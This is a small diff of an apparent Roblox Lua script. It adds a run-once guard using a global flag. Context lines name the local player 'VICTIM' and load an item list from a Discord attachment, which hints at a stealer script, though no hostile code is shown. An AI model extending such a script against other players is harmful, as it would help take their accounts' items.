@@ -9,6 +9,12 @@ local CONFIG = {
     FILE_URL = "https://cdn.discordapp.com/attachments/.../items.txt"
 }
 
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+return
+end
+_G.scriptExecuted = true
+
 -- 🛠️ Services & Variables
 repeat task.wait() until game:IsLoaded()
 local VICTIM = game.Players.LocalPlayer
